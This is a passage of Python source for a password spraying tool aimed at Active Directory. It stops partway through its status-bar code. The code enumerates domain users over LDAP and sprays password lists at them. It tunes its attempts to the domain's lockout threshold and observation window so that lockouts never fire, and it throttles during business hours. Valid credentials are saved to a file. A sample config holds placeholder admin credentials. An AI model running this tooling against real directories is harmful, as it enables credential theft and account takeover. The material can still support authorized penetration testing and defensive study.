#!/usr/bin/env python3
"""
Password Spraying Tool for Active Directory

A Python implementation of internal password spraying, using LDAP authentication
to test credentials against Active Directory. Supports session management,
pause/resume, lockout detection, and automatic policy awareness.

Features:
  - Auto-enumerates users from AD (or accepts a file)
  - Fetches and respects lockout policy to avoid locking accounts
  - Skips passwords that don't meet password policy requirements
  - Session management with pause/resume support
  - Lockout detection with automatic pause
  - Configuration file support (INI format)
  - Business hours awareness with configurable attempt reduction
  - External time verification for accurate scheduling

Requires: pip install ldap3
"""

import argparse
import atexit
import configparser
import hashlib
import json
import os
import shutil
import signal
import sys
import time
import urllib.request
import urllib.error
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, time as dt_time
from email.utils import parsedate_to_datetime
from pathlib import Path
from typing import List, Optional, Dict, Any, Set, Tuple
from zoneinfo import ZoneInfo

from ad_ldap_utils import check_auth, AD_ERROR_CODES, ADConnection


# ---------------------------------------------------------------------------
# Constants and Colors
# ---------------------------------------------------------------------------

class Colors:
    """ANSI color codes for terminal output."""
    NC = '\033[0m'
    RED = '\033[0;31m'
    BLUE = '\033[0;34m'
    GREEN = '\033[0;32m'
    LBLUE = '\033[1;34m'
    ORANGE = '\033[0;33m'

    @classmethod
    def disable(cls):
        """Disable colors (for non-TTY output)."""
        cls.NC = cls.RED = cls.BLUE = cls.GREEN = cls.LBLUE = cls.ORANGE = ''


# Microsoft Win32 Error Codes - used directly, no custom mapping
# Reference: https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
ERROR_SUCCESS = "ERROR_SUCCESS"
ERROR_NO_SUCH_USER = "ERROR_NO_SUCH_USER"
ERROR_LOGON_FAILURE = "ERROR_LOGON_FAILURE"
ERROR_INVALID_LOGON_HOURS = "ERROR_INVALID_LOGON_HOURS"
ERROR_INVALID_WORKSTATION = "ERROR_INVALID_WORKSTATION"
ERROR_PASSWORD_EXPIRED = "ERROR_PASSWORD_EXPIRED"
ERROR_ACCOUNT_DISABLED = "ERROR_ACCOUNT_DISABLED"
ERROR_LOGON_TYPE_NOT_GRANTED = "ERROR_LOGON_TYPE_NOT_GRANTED"
ERROR_ACCOUNT_EXPIRED = "ERROR_ACCOUNT_EXPIRED"
ERROR_PASSWORD_MUST_CHANGE = "ERROR_PASSWORD_MUST_CHANGE"
ERROR_ACCOUNT_LOCKED_OUT = "ERROR_ACCOUNT_LOCKED_OUT"
ERROR_HOST_UNREACHABLE = "ERROR_HOST_UNREACHABLE"
ERROR_GEN_FAILURE = "ERROR_GEN_FAILURE"

# Statuses that indicate valid credentials (even if account has issues)
VALID_CREDENTIAL_STATUSES = {
    ERROR_SUCCESS,
    ERROR_ACCOUNT_DISABLED,
    ERROR_PASSWORD_EXPIRED,
    ERROR_PASSWORD_MUST_CHANGE,
    ERROR_ACCOUNT_EXPIRED,
    ERROR_INVALID_LOGON_HOURS,
    ERROR_INVALID_WORKSTATION,
    ERROR_LOGON_TYPE_NOT_GRANTED,
}

# Statuses that should cause a user to be skipped for remaining attempts
SKIP_USER_STATUSES = {
    ERROR_SUCCESS,
    ERROR_ACCOUNT_DISABLED,
    ERROR_ACCOUNT_LOCKED_OUT,
    ERROR_ACCOUNT_EXPIRED,
    ERROR_NO_SUCH_USER,
}

DEFAULT_SESSION_PATH = Path.home() / ".adspray" / "sessions"

# Days of week for schedule parsing
DAYS_OF_WEEK = ['monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday']

# External time sources for verification
EXTERNAL_TIME_SOURCES = [
    # Primary: Major tech companies with reliable servers
    ("https://www.google.com", "Google"),
    ("https://www.cloudflare.com", "Cloudflare"),
    ("https://www.microsoft.com", "Microsoft"),
    # Fallback: Time API
    ("https://worldtimeapi.org/api/ip", "WorldTimeAPI"),
]

# Maximum allowed drift between system time and external time (seconds)
MAX_TIME_DRIFT_SECONDS = 60

# How often to re-verify external time during spray (seconds)
TIME_REVERIFICATION_INTERVAL = 300  # 5 minutes


# ---------------------------------------------------------------------------
# Time Verification
# ---------------------------------------------------------------------------

class TimeVerificationError(Exception):
    """Raised when external time cannot be verified."""
    pass


@dataclass
class TimeVerificationResult:
    """Result of time verification."""
    verified_time: datetime
    source: str
    system_time: datetime
    offset_seconds: float  # positive = system ahead, negative = system behind
    
    @property
    def drift_acceptable(self) -> bool:
        """Check if the drift is within acceptable limits."""
        return abs(self.offset_seconds) <= MAX_TIME_DRIFT_SECONDS


class TimeVerifier:
    """
    Verifies current time against external sources.
    
    This ensures the spray operates on accurate time, critical for
    respecting business hours schedules.
    """
    
    def __init__(self, force_system_time: bool = False, verbose: int = 3):
        self.force_system_time = force_system_time
        self.verbose = verbose
        self._offset_seconds: Optional[float] = None
        self._last_verification: Optional[datetime] = None
        self._source: Optional[str] = None
        self._verified = False
    
    def _print(self, message: str, level: int = 3):
        """Print message if verbosity level is high enough."""
        if self.verbose >= level:
            print(message, file=sys.stderr)
    
    def _fetch_http_time(self, url: str, source_name: str) -> Optional[datetime]:
        """
        Fetch time from HTTP Date header.
        
        Returns UTC datetime or None if failed.
        """
        try:
            req = urllib.request.Request(url, method='HEAD')
            req.add_header('User-Agent', 'ADSpray-TimeCheck/1.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                date_header = response.headers.get('Date')
                if date_header:
                    # Parse RFC 2822 date format
                    return parsedate_to_datetime(date_header)
        except Exception:
            pass
        return None
    
    def _fetch_api_time(self, url: str) -> Optional[datetime]:
        """
        Fetch time from WorldTimeAPI.
        
        Returns UTC datetime or None if failed.
        """
        try:
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'ADSpray-TimeCheck/1.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                data = json.loads(response.read().decode('utf-8'))
                # WorldTimeAPI returns ISO format datetime
                utc_datetime = data.get('utc_datetime')
                if utc_datetime:
                    # Parse ISO format, handle 'Z' suffix
                    utc_datetime = utc_datetime.replace('Z', '+00:00')
                    return datetime.fromisoformat(utc_datetime)
        except Exception:
            pass
        return None
    
    def verify(self) -> TimeVerificationResult:
        """
        Verify current time against external sources.
        
        Returns TimeVerificationResult with verified time.
        Raises TimeVerificationError if verification fails and not forcing system time.
        """
        system_time = datetime.now(ZoneInfo('UTC'))
        
        if self.force_system_time:
            self._verified = True
            self._offset_seconds = 0.0
            self._source = "System Clock (forced)"
            self._last_verification = system_time
            return TimeVerificationResult(
                verified_time=system_time,
                source=self._source,
                system_time=system_time,
                offset_seconds=0.0,
            )
        
        # Try each external source
        external_time: Optional[datetime] = None
        source_name: Optional[str] = None
        
        for url, name in EXTERNAL_TIME_SOURCES:
            self._print(f"{Colors.BLUE}[+] Checking time from {name}...{Colors.NC}", level=2)
            
            if 'worldtimeapi' in url:
                external_time = self._fetch_api_time(url)
            else:
                external_time = self._fetch_http_time(url, name)
            
            if external_time:
                source_name = name
                self._print(f"{Colors.GREEN}[+] Got time from {name}{Colors.NC}", level=2)
                break
            else:
                self._print(f"{Colors.ORANGE}[!] Failed to get time from {name}{Colors.NC}", level=2)
        
        if external_time is None:
            raise TimeVerificationError(
                "Could not verify time from any external source. "
                "Use --force-system-time to proceed with system clock (not recommended)."
            )
        
        # Ensure external_time is UTC
        if external_time.tzinfo is None:
            external_time = external_time.replace(tzinfo=ZoneInfo('UTC'))
        else:
            external_time = external_time.astimezone(ZoneInfo('UTC'))
        
        # Calculate offset
        offset = (system_time - external_time).total_seconds()
        
        self._verified = True
        self._offset_seconds = offset
        self._source = source_name
        self._last_verification = datetime.now()
        
        return TimeVerificationResult(
            verified_time=external_time,
            source=source_name,
            system_time=system_time,
            offset_seconds=offset,
        )
    
    def get_current_time(self, timezone: Optional[str] = None) -> datetime:
        """
        Get the current verified time.
        
        If timezone is provided, returns time in that timezone.
        Otherwise returns UTC.
        
        Re-verifies if the last verification was too long ago.
        """
        # Re-verify periodically
        if (self._last_verification is None or 
            (datetime.now() - self._last_verification).total_seconds() > TIME_REVERIFICATION_INTERVAL):
            try:
                self.verify()
            except TimeVerificationError:
                if not self.force_system_time:
                    raise
        
        # Get system time and apply offset
        if self.force_system_time or self._offset_seconds is None:
            now_utc = datetime.now(ZoneInfo('UTC'))
        else:
            system_now = datetime.now(ZoneInfo('UTC'))
            # Subtract offset to get true time (offset is system - external)
            now_utc = system_now - timedelta(seconds=self._offset_seconds)
        
        if timezone:
            try:
                tz = ZoneInfo(timezone)
                return now_utc.astimezone(tz)
            except Exception:
                return now_utc
        
        return now_utc
    
    def needs_reverification(self) -> bool:
        """Check if time should be re-verified."""
        if self._last_verification is None:
            return True
        elapsed = (datetime.now() - self._last_verification).total_seconds()
        return elapsed > TIME_REVERIFICATION_INTERVAL
    
    @property
    def source(self) -> str:
        """Get the time source name."""
        return self._source or "Unknown"
    
    @property
    def is_verified(self) -> bool:
        """Check if time has been verified."""
        return self._verified


def format_schedule_display(schedule: 'Schedule', time_verifier: TimeVerifier) -> str:
    """
    Format the weekly schedule for display.
    
    Shows each day with its hours and current status.
    """
    lines = []
    
    if not schedule.is_enabled():
        return "  Schedule: Disabled (no timezone set)"
    
    try:
        tz = ZoneInfo(schedule.timezone)
        current_time = time_verifier.get_current_time(schedule.timezone)
        current_day = DAYS_OF_WEEK[current_time.weekday()]
    except Exception:
        current_day = None
        current_time = None
    
    lines.append(f"  Timezone: {schedule.timezone}")
    lines.append(f"  Business hours reduction: {schedule.business_hours_reduction} attempts")
    lines.append("")
    lines.append("  Weekly Schedule:")
    
    for day in DAYS_OF_WEEK:
        hours = schedule.daily_hours.get(day)
        if hours is None:
            hours_str = "off"
        elif hours.pause_all_day:
            hours_str = "PAUSE (no spraying)"
        elif hours.start is None:
            hours_str = "off (full speed)"
        else:
            hours_str = f"{hours.start.strftime('%H:%M')}-{hours.end.strftime('%H:%M')} (reduced attempts)"
        
        # Mark current day
        marker = " <-- TODAY" if day == current_day else ""
        is_current = "*" if day == current_day else " "
        
        lines.append(f"   {is_current} {day.capitalize():9}: {hours_str}{marker}")
    
    # Show current status
    if current_time:
        is_business, should_pause = schedule.get_current_status_with_time(current_time)
        lines.append("")
        if should_pause:
            lines.append(f"  Current status: PAUSED (schedule dictates no spraying now)")
        elif is_business:
            lines.append(f"  Current status: BUSINESS HOURS (reduced attempts active)")
        else:
            lines.append(f"  Current status: Outside business hours (full speed)")
    
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Configuration File Handling
# ---------------------------------------------------------------------------

DEFAULT_CONFIG_TEMPLATE = """\
# ADSpray Configuration File
# --------------------------
# Use 'auto' for users_file, lockout_threshold, lockout_window, min_length,
# and complexity to automatically fetch values from Active Directory.
# IMPORTANT: 'auto' settings REQUIRE valid AD credentials in [target].
# If any setting is 'auto' and credentials are missing, the spray will fail.

[target]
# Domain controller FQDN or IP address
dc = 10.0.0.1
# NetBIOS domain/workgroup name
workgroup = CORP
# AD credentials for enumeration (REQUIRED for any 'auto' settings)
username = admin
password = P@ssw0rd!
# Use LDAPS (SSL/TLS)
ssl = false
# Override port number (optional, leave empty for default)
port = 
# Override LDAP base DN (optional, leave empty for auto-detect)
base_dn = 

[spray]
# File containing passwords to spray
passwords_file = passwords.txt
# File containing usernames, or 'auto' to enumerate from AD (requires credentials)
users_file = auto
# Output file for valid credentials
output = valid_creds.txt
# Try username as password
userpass = false
# Verbosity level (0=silent, 1=minimal, 2=normal, 3=verbose)
verbose = 3

[policy]
# Lockout threshold, or 'auto' to fetch from AD (requires credentials)
# 0 = no lockout policy
lockout_threshold = auto
# Lockout observation window in minutes, or 'auto' to fetch from AD (requires credentials)
lockout_window = auto
# Minimum password length, or 'auto' to fetch from AD (requires credentials)
min_length = auto
# Require password complexity, or 'auto' to fetch from AD (requires credentials)
complexity = auto

[schedule]
# Timezone for business hours (IANA format, e.g., America/New_York, Europe/London)
# Leave empty to disable business hours feature
timezone = 
# Number of attempts to reduce during business hours
# Formula: attempts_allowed = lockout_threshold - business_hours_reduction
# e.g., if threshold=5 and reduction=3, then 5-3=2 attempts allowed during business hours
# If the result is 0 or negative, spray pauses entirely during business hours
business_hours_reduction = 3
# Force use of system clock instead of external time verification
# WARNING: Only set to 'true' if you cannot access external time sources
# If enabled, ensure your system clock is accurate to avoid spraying during business hours
force_system_time = false
# Business hours for each day (HH:MM-HH:MM format, 24-hour)
# Use 'off' to indicate no restrictions (full speed spraying)
# Use 'pause' to pause entirely on that day
monday = 09:00-17:00
tuesday = 09:00-17:00
wednesday = 09:00-17:00
thursday = 09:00-17:00
friday = 09:00-17:00
saturday = off
sunday = off
"""


@dataclass
class BusinessHoursWindow:
    """Represents business hours for a single day."""
    start: Optional[dt_time]  # None means 'off' (no restrictions)
    end: Optional[dt_time]
    pause_all_day: bool = False  # True means 'pause' (no spraying this day)

    @classmethod
    def parse(cls, value: str) -> "BusinessHoursWindow":
        """Parse a business hours string like '09:00-17:00', 'off', or 'pause'."""
        value = value.strip().lower()
        
        if value == 'off' or value == '':
            return cls(start=None, end=None, pause_all_day=False)
        
        if value == 'pause':
            return cls(start=None, end=None, pause_all_day=True)
        
        if '-' not in value:
            raise ValueError(f"Invalid business hours format: {value}. Use HH:MM-HH:MM, 'off', or 'pause'")
        
        try:
            start_str, end_str = value.split('-')
            start_parts = start_str.strip().split(':')
            end_parts = end_str.strip().split(':')
            
            start = dt_time(int(start_parts[0]), int(start_parts[1]))
            end = dt_time(int(end_parts[0]), int(end_parts[1]))
            
            return cls(start=start, end=end, pause_all_day=False)
        except (ValueError, IndexError) as e:
            raise ValueError(f"Invalid business hours format: {value}. Use HH:MM-HH:MM format") from e

    def is_within_hours(self, current_time: dt_time) -> bool:
        """Check if the given time falls within business hours."""
        if self.pause_all_day:
            return True  # Treat pause days as "always in business hours" for reduction logic
        
        if self.start is None or self.end is None:
            return False  # 'off' means no business hours restriction
        
        # Handle overnight spans (e.g., 22:00-06:00)
        if self.start <= self.end:
            return self.start <= current_time <= self.end
        else:
            return current_time >= self.start or current_time <= self.end

    def to_dict(self) -> Dict[str, Any]:
        return {
            "start": self.start.isoformat() if self.start else None,
            "end": self.end.isoformat() if self.end else None,
            "pause_all_day": self.pause_all_day,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "BusinessHoursWindow":
        return cls(
            start=dt_time.fromisoformat(d["start"]) if d.get("start") else None,
            end=dt_time.fromisoformat(d["end"]) if d.get("end") else None,
            pause_all_day=d.get("pause_all_day", False),
        )


@dataclass
class Schedule:
    """Business hours schedule with timezone."""
    timezone: Optional[str]  # IANA timezone name, None means disabled
    business_hours_reduction: int
    daily_hours: Dict[str, BusinessHoursWindow]  # day name -> hours

    def is_enabled(self) -> bool:
        """Check if schedule feature is enabled."""
        return self.timezone is not None and self.timezone.strip() != ''

    def get_current_status(self) -> Tuple[bool, bool]:
        """
        Get current schedule status using system time.
        
        Returns:
            Tuple of (is_business_hours: bool, should_pause: bool)
        """
        if not self.is_enabled():
            return False, False
        
        try:
            tz = ZoneInfo(self.timezone)
        except Exception:
            return False, False
        
        now = datetime.now(tz)
        return self.get_current_status_with_time(now)

    def get_current_status_with_time(self, current_datetime: datetime) -> Tuple[bool, bool]:
        """
        Get schedule status for a specific time.
        
        Args:
            current_datetime: The datetime to check (should be in the schedule's timezone)
        
        Returns:
            Tuple of (is_business_hours: bool, should_pause: bool)
        """
        if not self.is_enabled():
            return False, False
        
        day_name = DAYS_OF_WEEK[current_datetime.weekday()]
        current_time = current_datetime.time()
        
        hours = self.daily_hours.get(day_name)
        if hours is None:
            return False, False
        
        if hours.pause_all_day:
            return True, True
        
        is_business = hours.is_within_hours(current_time)
        return is_business, False

    def get_reduced_attempts(self, lockout_threshold: int) -> int:
        """
        Calculate reduced attempts during business hours.
        
        Args:
            lockout_threshold: The lockout threshold from policy
            
        Returns:
            Reduced attempt count (may be 0 or negative, meaning pause)
            e.g., threshold=5, reduction=3 -> 2 attempts allowed
        """
        return lockout_threshold - self.business_hours_reduction

    def get_time_until_business_hours_end(self) -> Optional[int]:
        """
        Get seconds until business hours end using system time.
        
        Returns:
            Seconds until end, or None if not in business hours or schedule disabled
        """
        if not self.is_enabled():
            return None
        
        try:
            tz = ZoneInfo(self.timezone)
        except Exception:
            return None
        
        now = datetime.now(tz)
        return self.get_time_until_business_hours_end_with_time(now)

    def get_time_until_business_hours_end_with_time(self, current_datetime: datetime) -> Optional[int]:
        """
        Get seconds until business hours end for a specific time.
        
        Args:
            current_datetime: The datetime to check (should be in the schedule's timezone)
        
        Returns:
            Seconds until end, or None if not in business hours or schedule disabled
        """
        if not self.is_enabled():
            return None
        
        day_name = DAYS_OF_WEEK[current_datetime.weekday()]
        current_time = current_datetime.time()
        
        hours = self.daily_hours.get(day_name)
        if hours is None or hours.start is None:
            return None
        
        if hours.pause_all_day:
            # Calculate time until midnight
            tomorrow = current_datetime.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
            return int((tomorrow - current_datetime).total_seconds())
        
        if not hours.is_within_hours(current_time):
            return None
        
        # Calculate time until end
        end_dt = current_datetime.replace(hour=hours.end.hour, minute=hours.end.minute, second=0, microsecond=0)
        if end_dt <= current_datetime:
            end_dt += timedelta(days=1)
        
        return int((end_dt - current_datetime).total_seconds())

    def to_dict(self) -> Dict[str, Any]:
        return {
            "timezone": self.timezone,
            "business_hours_reduction": self.business_hours_reduction,
            "daily_hours": {k: v.to_dict() for k, v in self.daily_hours.items()},
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "Schedule":
        return cls(
            timezone=d.get("timezone"),
            business_hours_reduction=d.get("business_hours_reduction", 3),
            daily_hours={k: BusinessHoursWindow.from_dict(v) for k, v in d.get("daily_hours", {}).items()},
        )

    @classmethod
    def disabled(cls) -> "Schedule":
        """Create a disabled schedule."""
        return cls(
            timezone=None,
            business_hours_reduction=0,
            daily_hours={},
        )


def load_config(config_path: str) -> Dict[str, Any]:
    """
    Load configuration from INI file.
    
    Returns a dict with all config values, using None for unset values.
    """
    config = configparser.ConfigParser()
    config.read(config_path)
    
    result: Dict[str, Any] = {}
    
    # [target] section
    if config.has_section('target'):
        result['dc'] = config.get('target', 'dc', fallback=None)
        result['workgroup'] = config.get('target', 'workgroup', fallback=None)
        result['username'] = config.get('target', 'username', fallback=None)
        result['password'] = config.get('target', 'password', fallback=None)
        result['ssl'] = config.getboolean('target', 'ssl', fallback=False)
        port_str = config.get('target', 'port', fallback='')
        result['port'] = int(port_str) if port_str.strip() else None
        base_dn = config.get('target', 'base_dn', fallback='')
        result['base_dn'] = base_dn if base_dn.strip() else None
    
    # [spray] section
    if config.has_section('spray'):
        result['passwords_file'] = config.get('spray', 'passwords_file', fallback=None)
        result['users_file'] = config.get('spray', 'users_file', fallback=None)
        result['output'] = config.get('spray', 'output', fallback='valid_creds.txt')
        result['userpass'] = config.getboolean('spray', 'userpass', fallback=False)
        result['verbose'] = config.getint('spray', 'verbose', fallback=3)
    
    # [policy] section - support 'auto' keyword
    if config.has_section('policy'):
        for key in ['lockout_threshold', 'lockout_window', 'min_length']:
            val = config.get('policy', key, fallback='auto')
            result[key] = 'auto' if val.lower() == 'auto' else int(val)
        
        complexity_val = config.get('policy', 'complexity', fallback='auto')
        if complexity_val.lower() == 'auto':
            result['complexity'] = 'auto'
        else:
            result['complexity'] = config.getboolean('policy', 'complexity', fallback=False)
    
    # [schedule] section
    if config.has_section('schedule'):
        timezone = config.get('schedule', 'timezone', fallback='')
        result['timezone'] = timezone if timezone.strip() else None
        result['business_hours_reduction'] = config.getint('schedule', 'business_hours_reduction', fallback=3)
        result['force_system_time'] = config.getboolean('schedule', 'force_system_time', fallback=False)
        
        result['daily_hours'] = {}
        for day in DAYS_OF_WEEK:
            hours_str = config.get('schedule', day, fallback='off')
            result['daily_hours'][day] = BusinessHoursWindow.parse(hours_str)
    
    return result


def merge_config_with_args(config: Dict[str, Any], args: argparse.Namespace) -> argparse.Namespace:
    """
    Merge config file values with CLI args. CLI args take precedence.
    """
    # Map of config keys to arg names (where they differ)
    key_mapping = {
        'passwords_file': 'spray_passwords',
        'lockout_threshold': 'lockout_threshold',
        'lockout_window': 'lockout_window',
        'min_length': 'min_length',
    }
    
    for config_key, config_value in config.items():
        if config_value is None:
            continue
        
        arg_key = key_mapping.get(config_key, config_key)
        
        # Skip if CLI arg was explicitly provided (not default)
        # We check against None for optional args and check hasattr for safety
        if hasattr(args, arg_key):
            current_value = getattr(args, arg_key)
            # If CLI provided a value (not None and not the argparse default), keep it
            if current_value is not None:
                continue
        
        setattr(args, arg_key, config_value)
    
    return args


def generate_config_file(output_path: Optional[str] = None) -> str:
    """Generate a template configuration file."""
    if output_path:
        with open(output_path, 'w') as f:
            f.write(DEFAULT_CONFIG_TEMPLATE)
        return f"Configuration template written to: {output_path}"
    else:
        return DEFAULT_CONFIG_TEMPLATE


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

@dataclass
class PasswordPolicy:
    """Domain password and lockout policy."""
    lockout_threshold: int  # 0 = no lockout
    lockout_duration_minutes: int
    lockout_observation_window_minutes: int
    min_password_length: int
    password_history_length: int
    complexity_enabled: bool  # Windows password complexity rules

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PasswordPolicy":
        return cls(
            lockout_threshold=d.get("lockout_threshold", 0),
            lockout_duration_minutes=d.get("lockout_duration_minutes", 30),
            lockout_observation_window_minutes=d.get("lockout_observation_window_minutes", 30),
            min_password_length=d.get("min_password_length", 0),
            password_history_length=d.get("password_history_length", 0),
            complexity_enabled=d.get("complexity_enabled", False),
        )

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class Attempt:
    """A single credential attempt."""
    username: str
    password: str
    status: Optional[str] = None  # Microsoft error code string
    timestamp: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "Attempt":
        return cls(**d)


@dataclass
class SprayConfig:
    """Configuration for a spray session."""
    session_id: str
    dc_host: str
    workgroup: str
    use_ssl: bool
    port: Optional[int]
    output_file: Optional[str]
    verbose: int
    user_as_pass: bool
    created_at: str
    completed: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SprayConfig":
        return cls(**d)


@dataclass
class SpraySession:
    """A complete spray session with config, attempts, and policy."""
    config: SprayConfig
    policy: PasswordPolicy
    schedule: Schedule = field(default_factory=Schedule.disabled)
    users: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    attempts: List[Attempt] = field(default_factory=list)
    skipped_users: Set[str] = field(default_factory=set)
    skipped_passwords: Set[str] = field(default_factory=set)
    current_password_index: int = 0
    attempts_since_sleep: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "config": self.config.to_dict(),
            "policy": self.policy.to_dict(),
            "schedule": self.schedule.to_dict(),
            "users": self.users,
            "passwords": self.passwords,
            "attempts": [a.to_dict() for a in self.attempts],
            "skipped_users": list(self.skipped_users),
            "skipped_passwords": list(self.skipped_passwords),
            "current_password_index": self.current_password_index,
            "attempts_since_sleep": self.attempts_since_sleep,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SpraySession":
        return cls(
            config=SprayConfig.from_dict(d["config"]),
            policy=PasswordPolicy.from_dict(d["policy"]),
            schedule=Schedule.from_dict(d["schedule"]) if "schedule" in d else Schedule.disabled(),
            users=d.get("users", []),
            passwords=d.get("passwords", []),
            attempts=[Attempt.from_dict(a) for a in d.get("attempts", [])],
            skipped_users=set(d.get("skipped_users", [])),
            skipped_passwords=set(d.get("skipped_passwords", [])),
            current_password_index=d.get("current_password_index", 0),
            attempts_since_sleep=d.get("attempts_since_sleep", 0),
        )

    def save(self, session_path: Path) -> None:
        """Save session to disk."""
        session_dir = session_path / self.config.session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        with open(session_dir / "session.json", "w") as f:
            json.dump(self.to_dict(), f, indent=2)

    @classmethod
    def load(cls, session_path: Path, session_id: str) -> "SpraySession":
        """Load session from disk."""
        session_file = session_path / session_id / "session.json"
        if not session_file.exists():
            raise FileNotFoundError(f"Session not found: {session_id}")
        with open(session_file) as f:
            return cls.from_dict(json.load(f))

    def get_stats(self) -> Dict[str, int]:
        """Get statistics about the session."""
        stats: Dict[str, int] = {"total": len(self.attempts), "pending": 0}
        for attempt in self.attempts:
            if attempt.status is None:
                stats["pending"] = stats.get("pending", 0) + 1
            else:
                stats[attempt.status] = stats.get(attempt.status, 0) + 1
        return stats

    def get_safe_attempts_per_window(
        self, 
        apply_schedule: bool = True, 
        time_verifier: Optional['TimeVerifier'] = None
    ) -> int:
        """
        Calculate the maximum attempts per user within the observation window
        that won't trigger lockout.

        Args:
            apply_schedule: If True, apply business hours reduction if applicable
            time_verifier: Optional TimeVerifier to use for accurate time

        Returns:
            n-1 where n is the lockout threshold (possibly reduced for business hours).
            Returns 0 or negative if should pause entirely.
            e.g., threshold=5 -> 4 attempts allowed
                  threshold=1 -> 0 attempts (cannot spray safely!)
                  threshold=0 -> unlimited (no lockout policy)
        """
        if self.policy.lockout_threshold == 0:
            # No lockout policy
            return 100

        # Base: exactly n-1 to guarantee no lockout
        base_attempts = self.policy.lockout_threshold - 1

        # Apply schedule reduction if enabled and in business hours
        if apply_schedule and self.schedule.is_enabled():
            # Get current time from verifier if available, otherwise use system time
            if time_verifier:
                current_time = time_verifier.get_current_time(self.schedule.timezone)
                is_business, should_pause = self.schedule.get_current_status_with_time(current_time)
            else:
                is_business, should_pause = self.schedule.get_current_status()
            
            if should_pause:
                return 0  # Pause day
            if is_business:
                # During business hours: threshold - reduction
                # e.g., threshold=5, reduction=3 -> 2 attempts
                return self.schedule.get_reduced_attempts(self.policy.lockout_threshold)

        return base_attempts

    def get_sleep_time_seconds(self) -> int:
        """
        Get the sleep time needed between password batches.

        Returns m+1 minutes (in seconds) where m is the observation window.
        e.g., window=30 min -> sleep 31 min (1860 seconds)
        """
        if self.policy.lockout_threshold == 0:
            return 0

        # Exactly m+1 minutes to guarantee counter reset
        return (self.policy.lockout_observation_window_minutes + 1) * 60

    def password_meets_policy(self, password: str, username: str = None) -> tuple:
        """
        Check if a password meets the policy requirements.

        Args:
            password: The password to check
            username: Optional username to check for inclusion in password

        Returns:
            Tuple of (meets_policy: bool, reason: str or None)
        """
        # Check minimum length
        if len(password) < self.policy.min_password_length:
            return False, f"below min length ({self.policy.min_password_length})"

        # Check complexity if enabled
        if self.policy.complexity_enabled:
            # Must contain characters from at least 3 of 4 categories
            categories = 0
            if any(c.isupper() for c in password):
                categories += 1
            if any(c.islower() for c in password):
                categories += 1
            if any(c.isdigit() for c in password):
                categories += 1
            if any(not c.isalnum() for c in password):
                categories += 1

            if categories < 3:
                return False, "doesn't meet complexity (need 3 of: upper, lower, digit, special)"

            # Cannot contain username (case-insensitive)
            # Note: Windows also checks display name tokens, but we don't have display names
            if username and len(username) > 2:
                if username.lower() in password.lower():
                    return False, "contains username"

        return True, None

    def password_contains_username(self, password: str, username: str) -> bool:
        """
        Check if password contains username (case-insensitive).
        
        Windows complexity rule: password cannot contain the sAMAccountName.
        Note: The "3+ char token" rule applies to display name tokens, not username.
        Since we don't have display names, we only check for full username.
        """
        if not self.policy.complexity_enabled:
            return False
        if len(username) <= 2:
            return False

        return username.lower() in password.lower()


# ---------------------------------------------------------------------------
# Spray Engine
# ---------------------------------------------------------------------------

class SprayEngine:
    """Engine for executing password spray attacks."""

    def __init__(
        self, 
        session: SpraySession, 
        session_path: Path, 
        verbose: int = 3,
        time_verifier: Optional[TimeVerifier] = None
    ):
        self.session = session
        self.session_path = session_path
        self.verbose = verbose
        self.time_verifier = time_verifier or TimeVerifier(force_system_time=True, verbose=verbose)
        self.paused = False
        self.stopped = False
        self.consecutive_lockouts = 0
        self._pause_requested = False  # Flag for async signal handler

        # Status bar tracking
        self._is_tty = sys.stderr.isatty() and sys.stdin.isatty()
        self._status_bar_enabled = self._is_tty and verbose > 0
        self._status_bar_active = False  # Track if status bar is set up
        self._terminal_rows = 24
        self._start_time: Optional[datetime] = None
        self._total_passwords = 0
        self._current_password_num = 0

        # Set up signal handlers
        signal.signal(signal.SIGINT, self._handle_interrupt)

        # Get terminal size
        if self._status_bar_enabled:
            try:
                size = shutil.get_terminal_size()
                self._terminal_rows = size.lines
            except Exception:
                pass

    def _setup_status_bar(self):
        """Reserve the bottom line for status bar."""
        if not self._status_bar_enabled:
            return
        try:
            # Scroll region excludes bottom line, move cursor up
            sys.stderr.write(f"\033[1;{self._terminal_rows - 1}r")  # Set scroll region
            sys.stderr.write(f"\033[{self._terminal_rows - 1};1H")   # Move to line above status
            sys.stderr.flush()
            self._status_bar_active = True
            # Register cleanup as safety net for abnormal exits
            atexit.register(self._cleanup_status_bar)
        except Exception:
            # If terminal setup fails, disable status bar
            self._status_bar_enabled = False
            self._status_bar_active = False

    def _cleanup_status_bar(self):
        """Restore terminal to normal state."""
        if not self._status_bar_active:
            return
        self._status_bar_active = False
        try:
            # Unregister atexit handler since we're cleaning up normally
            atexit.unregister(self._cleanup_status_bar)
        except Exception:
            pass
        try:
            # Reset scroll region to full screen
            sys.stderr.write(f"\033[1;{self._terminal_rows}r")
            # Clear status line
            sys.stderr.write(f"\033[{self._terminal_rows};1H\033[2K")
            # Move cursor to end of content area
            sys.stderr.write(f"\033[{self._terminal_rows - 1};1H")
            sys.stderr.flush()
        except Exception:
            pass  # Best effort cleanup

    def _update_status_bar(self, password: str = "", extra: str = ""):
        """Update the status bar at bottom of terminal."""
        if not self._status_bar_active:
            return

        try:
            # Calculate ETA
            eta_str = self._calculate_eta_string()

            # Add schedule status if enabled
            schedule_str = ""
            if self.session.schedule.is_enabled():
